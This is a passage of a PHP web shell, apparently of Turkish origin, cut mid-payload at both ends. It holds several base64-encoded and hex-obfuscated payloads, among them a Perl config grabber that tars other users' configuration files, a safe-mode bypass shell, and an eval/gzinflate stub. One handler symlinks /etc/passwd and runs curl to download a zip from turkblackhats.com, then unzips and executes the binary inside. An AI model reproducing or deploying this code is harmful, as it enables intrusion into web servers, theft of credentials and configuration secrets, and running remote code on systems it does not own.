cHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICMwMEZG
RkY7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpU
YWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiMwMEZGRkY7ICIgIC8+PGJyIC8+DQombmJzcDs8
L3A+DQo8cD4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHZXQg
Q29uZmlnIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwRkZGRjsgd2lkdGg6IDk5OyBmb250
LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojMDBGRkZGOyB0ZXh0LXRyYW5z
Zm9ybTp1cHBlcmNhc2U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwv
cD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5l
czsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIu
JEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxp
bmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4i
LnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIu
dHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0i
IzAwMDAwMCI+DQo8cD5Eb25lICEhPC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9
IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3Nl
KElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0u
Jy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRp
b246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250Pjwv
YT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw==';

$file = fopen("config.izo" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("config.izo",0755);
   echo "<iframe src=configler/config.izo width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit15']))
{
    mkdir('oku', 0755);
    chdir('oku');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "Options all
DirectoryIndex 1.txt";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd 1.txt');
@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');
@exec('unzip ln.zip');
@exec('chmod 755 ln');
@exec('./ln -s /etc/passwd 1.txt');
   echo "<iframe src=oku/1.txt width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit16']))
{
    mkdir('safeof', 0755);
    chdir('safeof');

$safeshell = 'cjkvM3IrUDI5OWZyWEgvcnQvbjljNzIzci9meGRXenBYNjkyK1R6V2R6Lzl2djM4dVpiTDU2OXJs
ZHUzNDhmUDE2dmZ6aS8zYjlkcjMzN3ZmM0MvNytPWjQ2MS9NSjkvTnI3djgvOSt2ZS8zdTE2dmZC
dGYrWGIvcjJQcmQvdjkwZmo2LzcvZnYzUSs4OXUveGoyKzFycDkvZDYvM3V0dDJVMCtNNjg1L2VU
cjJPSDVmLzArNnJwR2Y2L2Y5TnJXZTZ1czQxd3JqcC9IemZmMjVYZjFjL25lR090ZTgvaUtuL1cr
L0hFZXV6K1cvODFyemZmSzlVZFo0OVN4ZFowM3g2dlhiZmwydFMzbWIzZnMzdFo1ODMzT3BUSnV6
YnVuLzFYc0todE0rNTM0UVZuK3A1aGc3SXFWT2JZMzU5WmxjNzN1K2Z1Y1MzMHgxdmV5amIrZngr
cGVYL2NkOTJXcnduM243Mk9rSGJRbXJOdll1TjZaNS9pYW5kLzY1L3BOWTJ6cmZWN1BhMW1KOFRr
ZUhYdXVOV3I0eHh5VHhrNnN5RTd6dDQvOHJEazBiTzE3ZlhLZERYKzVNU2ZtcVh1MmRhMjUzckxw
Q3h0d3pMUmZmNnoxbS9kb3ZuL2graHN4Vk5ZeDAxNzJOMkhmdWV6WmlFM2JaWDZXelh6ZnV1WXZl
N0NHOWJIbUtMODBMbTJzNjdaOFJyWTg4Yk82NWp0NG4yT1p2alhQMXp6MnRIdS9yWFBtZGVkOUsr
Zk1ZK1pjTk9adHZjL3o1elcxRmsvbU9zRHUvZWQ1enV2YlB0T3VjdzdOWXlOK3A4LzIrNXJQSUQ3
bjU0R3R5OGcxMWVkdCtVL2wraG9MWTUzK3BXdmZGcS9NZVl5MjFucStaSU9hdmpOOVJCZzM4TTlu
K3RtY3YrZmVlWi94TXV5TEJSL2FMbllieERBK0pOejR3Ty92YTJ3Nm4vV3p2V1ljQ0k4cVByOWpo
OWVhaC95QTlWZE12OUxQNWp5bUhYWGREK1p6dy9jLzA3OTBuMHM4RnNaalA3ZnZLQTVPN2xHWFh5
b3VLckZJUE01ajUrZkJ2UWIrSVRzOXdJOENwdmMxLzNtZmFTOXg0SmwyYm1DbmNQMkpEUjlyN2VZ
YzV1YzU5eG1IV3V2N3dsNWpqdnhnd3ljYXVQd0N6KzlvQzN4WDl3QmZxclVIZnFRNEk1Ym1iOU1H
d3U5em5hZlBiYTNQRlNmMVBYeGkyemZtS096QmRyTEJXSE5yWTQxTDh6R3ZFTjhhODBuOFBPR0tr
M3NOT092TU9iU0xyV1g3YlgybnNUN0J4OHA4aVpjR2Q4M3Z0R2JQOWQxOG4zYlczMzZaZThFcDRT
SDNtYjQrUDh2V0QreGJHTk10N2RQZ0JkbDFneWNmWU0yZVBDSTdZai81U1Yzem1PdmE4SE5oMmdB
bjhmbEd6RFZ3WkxmL0ZOYitCVllZK3o1VzNEUndWTEczd1Jkd25PSnQ0M2VPMllsRDRWMkRpOTVy
cmcyOTFMMDI4S1hXRkZ5cGFKNTVqdkNKdFJNdTNmQU5lRkoyT3huekRWdWg4UWJZSWl5N0V6ZjM1
Qy9oVHNmM2J1bXJtcmQ5OUlabXdVOFVKeSs0N1V4dUtNWWk0a3Z6dUsvN21sOFVJK09pOFlrSjZi
SnQzYk9DT1JyaldEYTJ4aE1ldnJrdmZLVGpPRjVqUThOVnRNOEFkeXI1Z3IvVHVoa2I4RjN4eHhP
ZnFSZDduOFNDT1JidDUzV3U1ai9yTk5hNEdpT0oyWUdmQzk4cTg4Wm42Mlh1c3FFNUVQMmtHRVd2
eXNlSnRlYnh2MWNNTk91T2o4VGMrWjJPdVdxNk85ZnAyUGVXMktONGVpYkc2UGh0eldtdW0vemla
SDI4cHZzYWczd01UU004dTZYR0U0ZTJ4VW5Db25GWkcrdFZiQ2VzWTEwYitaN3NoQjRWQjZLM0Mz
bUlmRzFIODRBWEhZNHlIbzZSV0ZxeGJVVmIxSkcvRDNQOXVjNVRQQk1udHJtdzgyS1grYmRqdWFH
akdyNFZHRkd4VzRGTDNzUTkyRHhhcmxlRmJ3bzZwUmlQcmZ1SjlYcW1IaElldHVXbmd6Z3BGL3pY
Zkt3YmIvRGN2czRyMW5WZzRiUkRoK09zN2JxMUJYYlcyTWxWekF2Q3BSUC9MbWlQRGY4c2liSE51
dVNHM1UrT1FZOEo1Mnp2bG5sT3hQdWR6OFlVNDlCdHpVSDV4VVhUQ1QvZ0llRUd1WlhqMWZpcHVX
ekUzcDN4bFV1YzRRLzZuVHh4a0l2SUJpYytUbzVSMFRDZG1CQ0c3Tmk3RUd1RGNjQXIvWjZZUHRl
OWdCUG1GV2xxY040eG9QaEZ1MXJyMi9jVW0vZlU0aFZ1N0doMHg1M21BYWNQYkJPNEFlODBlTHhZ
Ty9WZmYvLzNmL3Z0eDhmckwzLzdtd3M1RFFHbWkwSHVGaGtPMXVvRXcwRkxnTXVwTVp3SUFxZXRU
dEFON3VjUlFxWWhkRFdabW9uVEhLaUZtTVdVeUpGa2NDRGVDcUpCRHJFUktEMUIyUUhrUkx2aldG
ZVJYd2x1T1FHaVNTUlhDWllIQzNUaW5CWmhENXpLSXI5ei9Pc0NtaVFJZHNodUFOalhiMDdDT3du
d3VEaEgzWkxjS2dGWFN0cDRNRC9aMGduUGs2QjlBMjU3Z3B4c0F4RnJYS3lIN3Y5QU1MeVk0N2lN
MTBuYlNKSGloS1hnZENMTE4rT0NlQWNpcGpxSlFqUjBrbWc1c2tWOHk4OE5oeTRXZlFDd2JJMlB0
UzBKc0VIa1VTUjZZRitMYzVNN0NZaldCNEtSdUhEeG9CTEVHMzRPRVFwVW40eUZNVnB3RDBDaVVv
alFXSGZHNjBTUWQvbkdKMEZ2c1VnQ0hBV0tUNUtDa240d0xzbHNjY0hDWWhIYk9qWVY1QmFoQ0Q4
blppNFVOWk9seGZ5ZGExbkF2N0VwNUcxUXR3Q094SSsxN01SNE1WQTlFNGhjNExHTmhnc2RHK3Zi
MXJWY2VKS2dNZ0UvamhEb0Fta0xlTWZmWjc0a0FEdkE5K0p2eUcvc0tVaDk3b0NBWExEU2V0OXp2
aUxhdGw2RE9UYURQMnRVZS9wKzhYMFJTdkt2K3hHSmR0akYxMFlJV25qMFIyS1hTVUVKRjNhcUxu
eXdWaTVDaWRCY1hDQWhiTVRnMk5OZnUwbXY0Si8yRWZCUWNjdmNSVzdFcXNUdzgwSzBEZUlHc3ky
eUMxaGpzdGE2bXl0cWpxTmhHeGRralNVRGdkSHhzVTRoeHdtcUJlOGN5NDVJRXY3cytmZkF0eTFt
T3I2bGRkblRqNk9nKzNsa1VlTk1RbFpSaGNMSVRrenJzMzBSM0J0Tzd1REdkczg0bS9jMGRpbldk
bXhaVTNRb2pncHJqRC9Lam9XeHVCRDZ6bmNuMWhLQUgxei9EY1poLzBqSUszUFpraXVWN0cySU9a
SWt2M2N3YUpCSWxKb0ZXY2R5NWJpZjVrYlNZcUVxQVlSZ0V2YmJIMi80OUF0ZkJQK2FrK1YrUklI
QVJjRnBUeGRPbFJSZ0x3bmNKeG9DanBiUE1nWWx3R2dTeFQ1Y1VsMG9xTG1tbFNKbzlSd29KSVJt
UU5nMmhHWWxPVllCQmR5VHlJTGpPdjdpcGtGaHJQcE16SFY4Y1JDdjlsUE53d1hRYjhWc0Y0RmNV
TFBQZFdQTDQySUw0cmlCR1k3cmdVK1V5emt1VUdvdUxsQ2dkU3FKZ3d2dnN2RUhISHF5enNSYk14
K0FZN0wvRFF6NFlCM0JxZXI0b1NEUTBKeWRSQ0lLWFJRbTNEaHcwYjBnN3VYbkozZzZqaXdZT05r
NHdabmJ1cThMSFIwTzJ2RXg4Y0l0L3pZblNWOTBjTzFGSERQWEtESlpXeURJN2FOUmFFQkxqSDRw
R3JiazNIWlBMV3BOWE1FZitSTUpiQ1JPTCtMWDJoeU9LK1lXOUtjeG84SnQ0aXg4YlpCSVZ1STdl
QXhPVTVQcEEvOXhvdklpbGttMlFvZC9YR3k5SFZFb2RPSmhmQkdYdWlDTEhhb1Q4aGQ0ZGp1aU1k
SXArRmhieSs3dDR0Y3VMRm1qNFdlUmhJRUpqaitQUitQdytuNGVtZWQ0L3AzcjdIbDgzZE9PTG1S
RUV3LytIcll4SE9NbVlCUm83cW5UM1p5S29pazRwdS9JcmNTVDluOWZIKzFXNEZURjRnMi9laklP
KytxV3ZGYmhoZ0VuV291NGtlT2l2T3hkR0pmMUJYcmttbmNwOXRIWjBwa3VKcG5yeUtjYUdLbEUy
bHdLNTFqZkMzdGUyTi9GVytQQmZrVGh2NzdUenFFVG1FTkRweld3WG43MGhxUFE2SjFjcEpDUE5Y
Qk1Qa0R1TlZ4d01FZFFHSmVQVk1hRXJTdHI1a0pKOGZ5ZEQvVGtod1pmS09ZcG1yZ28zaS9ORHVX
Qjc3Uy83bk1lV2RDM0RxajVxdVJ3V3RlYU90SWJLb2FMcXozdDRyanFySnR5a0pLYzZXS2dZdTZH
UnRtUGFDQ29tRXVPNTJaUmpNYzh5V2RwdXgzY3g1ZWpZUGsrb2puYXlBZk1SV3BFbGVVcmpwUEtH
aFNhQ2dXN0R0WmZ1djU1QktjYjg1cDk5NnJwS0s0UGZGUUY1SDVFZmhlTlF2QnhvTjNFdmZoUGM2
UG50bnl2RzlmSUw1djFHYnc1d0F2ck05YzFyQk5helRqb2ovUWo2UU5qQnZsWk5HaytWaUduL1Bm
Zi8vcUlIVGxNdmlFZ0xLQmNaVkxIRFdCekJiZTc0NEM0ZFBMaWFyc0g0dTVCN081eGNvQlFjOUpX
RWJqdVBsWElUc0NCazFVbnJSdEJaeUdMODNsbmd3SFpsVzBaMllHOUU1Z1BBcHZFeXNMR2hTRWxS
QlpuZ0p3N2pCM3hKaEFGNUdSc0NpVmFkQ2VGRUZTN1owQTNpamthRy9PVlRSc08rZUJZSndjQW0z
ZUl1Rk5ncDNWM1drSHA0QzlIN0JhSm90d2xLYW5NdlVOQ0lnV0NXbURreEJMaGJUSG5ybHJyU1lR
Q2llMklxbUVuTVNrV0p1MklUcmRFbzlkMlkvNElGZ09raXpmaHlBaGRkOFJjQ0hKaVhoR2Y0M1lo
QzhqSjFWKy9PMmt5d2JnalVCQUV4WURTaitoNHVldnBuV1FXVVNiNjVzQkg3QWtZR3RmZmx2MWla
NElUQWlkZENGbmRCNUhyZ2xnbmtlOFc0VTZNRVFYZWdhRzEzdEozSWlGNlFscXZCT3VPTUNvUWZo
OTVMUmNPaW9zZkpHL2RRdGVkUmd1Z2k3QXFpSzFCSWlSL056aTlrc0NFSnlTRy9TTDJGTk9za1dJ
R0h4aThlMGRSdStJSEFxWVJFKzVrT0o1clNaOGJMZ0k5aitqc096bW94SHAzdDZoeUh0aW4yTUwy
Zy9XdEpHUmVuK0Z1UVUwQjVoMGFpbk1LTHE3WXU5dlozQlVoaVpLUG5HdmV6WjJOeHhISnFuY3d1
U3N1V3o2eCs4Znl6UXJPS0laMzdvY1FqZ0xLdm80dFRuZ1JIaTdjdWhDdU9UaDVOUDc2SGhEc3VD
ZjJ1S001TEk0cDZBbkhFZlBEZUlpUDZONWN2eE56VWFna2ZvUzFiYzFKdnNZMXZEdHZPS0ZtUFhY
dG5iSFlGbUNQL0JTc20ydHNRZU5DcXVLNmdtVWtDNVZDejZCajB5MVVXOGE2WWc3T01WWkVrZWVO
anhMbnd3bUp4WVZ0UzZ4YldBUlc0SythSTM3cDVIcFlIRnBVdGVUSGlwZ3hMOG4vd0hmN1Nyc1VQ
anZGUW5PQ08zL0ZHc0VKN3UySVRyYTdpcDNZTW1kR0FmZE5USkFJZGd2Mnh3WExXbzRyQ3JmbkVR
WDNZc3dITTkyZ2NlRTFkZ1JzWUhnRlMrNXAzNDRJOUk0Q0Y4QkRNN1FqQ29jRERQSnV5ektTcnhT
ZnhMYzdvRzVraVZkSVZOMmxWeXpjazN0ZGRIQnhVNXJLc2JBZFdSQnNpY1hpZjhlQ2svdVNjKy9n
ZVNRSCtKazcxZkoxYXhxNHJkR1lHY1M1RTNGcmgyRU5aZUhiMGk4YnZsVVI2NTI1Ui9jWWUwV01P
bW1qOE9DaXF4T080S2R6L2ViZHF4Mi9IOFJ6dFpBbjRiWEdhZXlnSzZ5anRhZDNMeFFFZXRpRW9r
R3NGMlB3bkJ0NlFJbFlXL09UNzZFM2hYc2I4UVN1ZWplTG0zTWEvejN0NzUzQzlsbmpSalQrWGtm
c3BGSXNiSXovRXg0Z0FWWHhFMHp5am9saHYwRi83MDZ1clFHZXFhZmtzK09JQWsrNVlLS0xFbEVZ
TWs2akJ4UXI2QzdyVHZrU1dzZ0ZVTTNYYTRibWpkMk5ySWx4dFhOZmQrd2R0OGJIU3BKcWpSMjc3
bDVIRkJZMHBpMnh6Z1dEU3ZMWEtUQzRTT0dkUm1QaytoZ0hGRk1VdE1abC9kckllN2x3N1FhUzhP
ZnppTHpGdkJMeGdWK0lZK0JETjA2cmVXMWI2MXVkYjZHOTNRaHY2Tlo2VHd5Tnd1ZDVoSDZ5emV5
bjFiaDkwZTdXdGNaYlk3cnpOTm5xVW14d011MWRCL0s3bXY2bmE4RC9ManBHQVJ6N2RMaS91L2hW
MFUvbGlJSnFOQU5zWC9zU09ZWWI0Tkd3ZlI2NXc5V3hjbWRjWUpZTDdyTDFkc1R1cU1KYUNQdTMx
QXYycmRKemg3cnNhNDVCb3dxWCtscEwrUklhekVWNTcvVFFkK1pOZk40RldlOWlzWVlQWGNENXpU
cWtIbGtnaFVmTXhkN2w5Rk11YS8xRkxEWDRXVnhHSExscDNLMlYzQUJHcHpVS1p1WXVIZHVQS0tL
S0M5RkNVWXd0aklkMUUzNFpCeW1xUkdFZHpyVDJkVTRaR25STFhTZXNKMWJjUkN6a2ZxUGtQS3V4
aUp4WnZrRU9MSDh4QjcrUGVBS2tYR0pRR04yWFgzcG5mNk53VmUwTDZBa1hWeHB4MXF3Qm5lOVVq
aUgzNi9kc2psakRhaTFHNnVmYUxwclpPUVM4YUZ4ZC9MWUtPWTkvL0xqLzNZVWNQekxneDJYc25D
YXVBWkY2QzUrRDM4TEV5VWhzdy9vOGNpdFQ1WG9JM0NDQi9ZaUtuWk82UVFJVk94Y1FVTzZXeGpa
cUZ3YytBQlBFVnQveUdnWnNiOTEzUjg0N1F5cEphbkZGOHJiR0xaR0dvTGtLYUNjVVRtS3JSWVdy
K0M0czdBbFlCYUJ5aGQrQzFNbTJkNmk0Y0ZBUnNONUdMckM2WGNDbEhkbVZHSXdUNFJvVlNRZ3pp
a2s0aW5jUUZBdlBsa1JWRUFSUllIbDhBOHZYRVlseng5SGRaWlhnSGtkMEJTMFdZc2RLTzZMclZu
RFczckp5N0lyd3VBYkxBeUQ0UEtKcm93UjhUd0liK0oyM2MzczdxTUFHKzN0M2tNYklPdW0rQkhC
amJDSndnL3hKWUpmczNBbjhFRElDSmlmUXJMdXIzTVdKNjNiRWpyVFlIVklSRnp0K3hUb2IrUHMx
K2ZQNDdwZDFHZ21ncXVEdTJIT3NkUWxnMi9DRGUvclhnTmc2QUJyYjJ6OEJMd01Ob0ZPOWxpNVNQ
ak54NmlTbnVoN2kxdGR3WWgvQ2M4dnJtVGgzRWp1VGFPWGEzc3JyTGRmZWJ1NENZWEZpMTRnekVq
VVhaQWVKdjNlZFhPTzVVZlJ3aDl1UFBCV3E2UzdldVlNelhHeURpSU1RVG9CNHV4RGxtU1RRd2Fo
dXdUL1NKeXNDSng2THRMaUJjTHhqeEdEdFhXSk9VRFFYZHhCSVZxSjR5RHk4b3lVNkpoc3g0TUlh
eDBkaSttYU1UbkxPSXg2QmNIZlVIWHJ2Wm5IUnBIQi9KOU9GQWw4VTRnZVk5RHFpdytVZGNGb2JC
TGlFRXZIdlJ4b0t3czVidmJWR3hpdzZJc0tDeXZsT2JqK1AyTUUwK0wyQ0g5NHBGY2thQ2FCM0hD
aFd0OFFURWJMWGhVSlk3Q0I4WVpkM2RwV2M2UHB4VG5IVTg0SjlrTE1FRXp6aVRxSWZyeG5HTHhL
WEhjeDExMVMrYkhGeFhuRDBuckZUd0FidmhLMnZ4TlNLUDRUZ2RFY05RVGJBZW04aGJpU3kzcGxT
TG9tcjdvWHZlTGREY3hLS1VCWnZFSk94cyswa1pseFlSWlM1QUdxK1ZWekREOE5KMi9QSVI2U2M0
UFFqeEpwRllUd0thN0Y3VDE1WExETXVkK2MxcnVjUmdqKzZiZWNSajdNRmQ1UGdPZ2sydnRTTG4x
NGZKeDM0akhmb2RjVDhRRytwTWZLWnRvd0VpalV2NkM4M2JLSkFlY3Y0Q3Y4Mkp1M0VGRmd6ck1t
ZVJ6d09OZkJuN3dncDRLa2JBOTRkS0g5OEhmbG9yWDBXVHZGdTI4QzVmc1F1WGYyTnpwT1lmMTdp
MmY1di9mZ0creERFMGlyZ29SOExVSnowUEQ5MlNCaVBYK2tMOXN0SVNJelA5dldQSEg5aFY0akdS
NkpYMFY4cVlwSEllTWVBaWlZVy82eExROU5XcjBzOVlsZU5jQUI4TWM3SG96Ym1YZk00QlRUdnVH
N3dlZXhDTjM1UXFCQU9PQTVJSW1ULzdZaWRydFp2OXNXRzNxNGorVFllYVlKN1ZLUzEvdHlPbjV0
cTczV3NkM3ZJdDBuYVhYQ1hKdXB3MUJNN2N4M3YwQm53bFJzbGlvOW44cjkzdncwS3JtNFl5Ullr
aUNwY25VY2tTOTR4NGFKL1BLcnp1ZUxLajRDNFFWRmNhTnlUZjl6NURoNWw3YXhCS3p3NmFCYTZx
UmRGU2ZCU0NTcmF3c1h1d25qZGdQVHVTdXVXQW80YjUwS1RPWGxzcVVPY0ZIZldJb3FESFo1RjIv
dXhUVjNmUE9uNzcvZ2RXcm5aUjF5Z1EydTQwZDdScnJFTDlnMlhvKzI4RHFIbktQZ0xkNXd2dFNP
Ymc5Y2k2NXUxZ2kvTWw5NUJHQm9VL1BWanNzYU5LRWc2VHNrbEZRZjRyL0RBM0diOEliNEtXdXU2
ZTloTmR6OHFGWHJzdkhEamVibkgrL2hwWjE0ODhvY2Z1Z2lrY2Rvdm5tdk40dEZIOG95Qjcvc0pp
bWdFNHBOZVQ4MjFIN0haWVpEWFJQNkRkcWpiUmZzd3ZuaVU5M1hFWTdQaTNpZjMzbzdjMlkwZEJ1
T1RYaVMvakFJRCtmNnd4bkVEREs0ZHpuZko0U3ErNDBhb2Q0VHArQVp1RWhOdFpQd0xnOUFFTzll
TkhURGdheW1wRWVJeFkzUjNZQU9heEx4WUtEeDZJMHMvTXorTXd0NSt3Ylo1enRleDg5K08vUFN2
U083L3d1ZXlybm45dHpSNlRYcy9mdjM5L1kvenYvNzBHLzhPNTgrLytIbXErZGZha0RQL1VrWG5Q
MzcvUHc9PSdceDI5XHgyOVx4MjlceDNCIiwiIik7Cj8+';

$file = fopen("safe.php" ,"w+");
$write = fwrite ($file ,base64_decode($safeshell));
fclose($file);
   echo "<iframe src=safeof/safe.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit17']))
{
    mkdir('forbidden', 0755);
    chdir('forbidden');

$forbid = 'PD9waHAKcHJlZ19yZXBsYWNlKCIvLiovZSIsIlx4NjVceDc2XHg2MVx4NkNceDI4XHg2N1x4N0Fc
eDY5XHg2RVx4NjZceDZDXHg2MVx4NzRceDY1XHgyOFx4NjJceDYxXHg3M1x4NjVceDM2XHgzNFx4
NUZceDY0XHg2NVx4NjNceDZGXHg2NFx4NjVceDI4J2xaekxqZ001Y2tYM0J2d1BqVVl2N00xQW1Y
eEphUGhQY3FPbk1ZQVhYdlUwL1BVdUJzOGhzOHBHQTdNUTlFb2x5V0RFdlRlQ3BINzc4L21mNmIr
M1gzNzUyMy84OHV2eFo3dDhQZmJqejFxK0h1MzRzM3pXKy81ZGZYNDl0cTlIR3AvdDE2L0gxL2Y3
MTNYNysrdHhINi9qdS83NWN6eVhyK2YyZFcycVg0OXlldC9HWjkrKzM3Ni96K24wL3V0ZTZmcmor
dmI5ZnZuSDc5UHR4LzNLaisvclg3VDNzeis5di9rdnh2UC85ZS9uK0gvZTcyZDc1L3VsSC8xTFA5
ci91amIvdE45ZjlhLyszL2IrcWQ4enZ2MnIzKzFycnN2WDkvWHJmZTZQek5qNzY4Zlg4OWY3eHYz
NmM4M0ROL0puekZIK21wZjhIdGZXZmN4TC95eCtjeG45ck8vMVB0L0hvOSszUG5pZnVlWkNHL1Mz
OTd2M3IvVytkMTk4TUs5NXROWDY2MGIvNytOMUgxdHZQM3lvald2NmQ5RVA3aDF0dnJIN2s3aW9Z
MXd4N3Rkb3MzL2YyNCt4OS9adW81Lzl1djVaSDMvRXpHUDRRNzkzNi8yNVlMdkwrQ3l1dHgvWXZM
ZVpqYm5Qc0UzOWFyZDJQNzh6MW9ZdHJxT2ZQUWFpajRYNC9XQTNmL01aNDJwKy84YnY3dHpqTnZy
VXIrOXpIZjIrcnJucDE1VU5HNG9CMk15eEJHYWtnU3Z4L1Q1OG9mdFAySmE1N3ZmcHR1eWZ4L2dh
YlJYdWRSMi83ZDlGZi9DcEdQZDdYTk50MW96OUcvTjZZLzdyK0M1akQ2L3QxM1FmTGZod3QxRW01
dUtlWUVmRUFQZnM4OWkvNzM3WUg4Wk0rUDZkMytEdmlUbU9lY3pqL3YxOXQzZjQwaE03NWRIbndM
WHJtT3ZlWHZqTkRYL2RSOXlHZlF2dHZ4YWVkQi9xOXc3N3BORmUrTmtUZjNxTjEvMytqYjcyMzBU
c1o2NTVjTjhiL296UE5tUHhNNjdwOXdvL0w2TnZXWjhsM3NLbkszM1o2SGNteHRwNFhZM1hDL0hE
ZVBxOVl6NDIybTNELytQOWpxMXZZMTc2dGRHdm5YN2Q0S3pQc0hHL2I4T1BZdTZlMktiaFc5aWlw
R0hIOE5WdDlLL2ZKL3B4UDcwSFY4SjNOOGJIOS8zZWNRMXhIL01IRG9UdlpINzdKcjRLTVhUbCt6
cStqNzUrdm1OQmYvVHY0djNHdk45NHJtT005ZkhEeitHZCtsazRGdlAxd2ZjZXcyN2hxL3V3dno0
US9wV0k3VGZ2WDh6ekRqYnRZTXMrYkJhYzBVYjhGT0k3YkxBTmUwZjdDZTdZbURmd3BQZW4yNjMz
T2FNOU9zWTBZaUhhQUJmNlhQVlk2SE1WSEFHZVpYaHFZdjRUYmtydzc1MnhYZUNkZlZ4YndZanU2
LzM2c01QcCs5N254bGl6WTdTZit2Ujk0VUQzZ1lRUFJmK3VLM2JpZDQrRlQ1VVlTM0pSUllOeC8v
NEl1K3pFOHdVZjM4ZHp2M2RnT2phTjlzUTJyd0Vmb3cvNFN2alFUbnlKUzJjK0J0c3o4OURiai9r
bVRzSUdYQjlqT09Hb3R1MTJTM3hmdUU5Q014UytEL3grWUNQd0lHSm13Mi9Ba29qaEU2NEZsdDNI
K0NwODFSL3hHdHlWNnhvK0hManp3RS9Cam5MU0VxRi9IL2dudjBuT1FWNnhXWjIvYmRpb2lpVmx4
Vzd2UTcrKzRQUGhEemZtNlQwK3krMkVrZUJieFFkQ1V6VDZlRm5qamMrSlN6RXkvTXg3M01BQVlp
aWpIY0wzbWM4aTM0QTlmV3pPUWVIemJ2K2kzaUgrQXU4WVMrQzEyQWlHRjJJMDdyR2R0TkdGOGQ3
cGw5b3IwUmM0TWpRYWZsR05BK0ppNTc1eVdrSVhpTy9wdXZSTjJJRFBrdllvYUMzR05IbnNnZTN1
eXpacXdReCtaclhtalRrRzF5dFlQcm40dWJpdzRJTXh2cy95NlFvZXhud1d4Z3NYVm1Lb3dWTjkv
TTVMNkk4RXg5QW45WFlmYXdGMzRuZHBZRjhqWDR0NUJ6Y0RFNGkxdU45bjNDZm1yNDAySzc2ZXdl
L0s1LzNlVXpNU2U0RzljRTg4YXlNd004dWx4SFZXejhrajVBM091WGxCNkQzNFZVMFQzNU9MeFpn
ZXA3amZsejBDbThxd1EwTlhoUjNBNnQ1L2ZhVnVLNjdWZWhFdmFieHU0TC82ck1BSkdVNldpOEkv
eFZQSGRXZWMyOEtEQ205WE5HbzE1c1hRNTdoUFVmT1YxWS9LOWNIREQrYjVoazVPaXpQRHQ0aXpI
VTIwNCtzUmp6dllmaHYyaUxnajN1U2JzTTJPSnJyUzd3U2Z0K0dEelR5UnZFbGVTK0IreEZqRHg1
eVROLzNEOWduL2lUakg5dWFPYXUzb096Z2JOZ0ZMdEdjZlUzeUdYY1dJNkpmeGRXZis0UGFKTzdk
ajVvVE5aemtGelJKenlWZ3ExMDh0Zk1MQTRuWDVtRGxEUVRPYW03VzB1RTl0RmRmajI0Vll6M0Iw
QStzeU5sZlRXRWRRcjFmaWNnY3ZqSnZBWEhJUzdUWnpubnk2UnhyalNQTGFhYTRySEpuZ2ovQ3RO
endCTGdWKzVHUGxzOHluR0IvNXFHMXQ2N2VCdCtCKzJBNjdKM0xIcE41SW85MkN6d1FHR0JkUGVL
ZUN5Zmh0YUxKMnpEcUV2TkhNSjEvNDUvWFgzLy8xWDM3Nzg0LzlmeTV2aTJJQnlJaVZKa0UrR09E
OW1PSTFKdkFOd0NBQVRISURwRytqODRxUWNNcnJzWkp5M2xlU25ZYW9iQ1RSa2FSdGF3RFRBU2s0
S0tZRDdPNHJzZWhHQ1ZFTmlSUVMrZ2lZZllHdTVCV0d2eUIrODNmblNwTC9kUkZrQkVrNmx0Qm5U
R0dYNTJpbkNicTBwYmdzQ2hVVHU0ck4zZ1FLZ2xZeDF5RHdHQWZ6a2lnSUpjaXozNjhSNEFWN0Ju
QkNyR0VyQWNHQ0E4bUl5YnRCVVhEQVpFSjI1N2Q1ekd1cWk2ekNGeVIvL0NYbk5TY1NVUVdrNGpX
SlFDSFpDbUQvQUZTQWZKRHpGYjg2Z1ZPQnVOTitFcStLbExibVZHQ3MyTnppaThTWjhhdm81NTM1
d3NjeWdCc2lFTnRsa3MxSzhNYnY4TC93YlVSNWdTZ1YrZUZyZDJ6M0hrQmpNbGNSOU1Va0dvSVZi
S0pQTi93SUFUTEZuQW1lZnA4WjkyT0JaZ0hVUWpRWkt4OEloaVFweUE5QkdySHlJbTRrSjhBOFJP
